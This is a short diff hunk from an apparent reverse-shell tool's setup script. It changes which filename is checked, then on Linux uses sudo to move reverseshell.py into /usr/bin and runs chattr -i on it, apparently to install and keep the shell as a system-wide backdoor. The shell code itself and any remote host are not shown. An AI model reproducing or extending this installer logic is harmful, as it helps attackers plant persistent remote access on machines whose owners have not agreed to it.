@@ -10,7 +10,7 @@ while True:
         os.system('clear')
 
         if platform == "linux":
-            FILE_CHECK = os.path.exists("reverseshell_self.py")
+            FILE_CHECK = os.path.exists("reverseshell.py")
             if FILE_CHECK == True:   
                 os.system('sudo mv reverseshell.py /usr/bin')
                 run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True)
